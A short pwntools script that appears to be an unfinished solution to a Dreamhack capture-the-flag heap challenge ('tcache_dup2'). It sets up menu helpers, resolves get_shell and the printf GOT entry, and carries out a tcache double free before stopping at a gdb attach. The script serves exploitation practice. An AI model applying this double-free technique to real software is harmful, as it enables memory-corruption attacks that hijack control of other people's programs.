from pwn import *

LOCAL = True
if LOCAL:
    p = process("./tcache_dup2")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


def create(size, data):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def modify(idx, size, data):
    p.sendlineafter("> ", b"2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", b"3")
    p.sendafter("idx: ", str(idx))


elf = ELF("./tcache_dup2")
libc = ELF("./libc-2.30.so")

get_shell = elf.symbols["get_shell"]
printf_got = elf.got["printf"]

# [1] Tcache Duplication Considering Chunk Count
create(0x10, b"dreamhack")  # idx: 0
create(0x10, b"tcachedup")  # idx: 1
delete(1)
delete(0)
modify(0, 0x10, b"A" * 8 + b"\x00")
delete(0)

gdb.attach(p)
# [2]
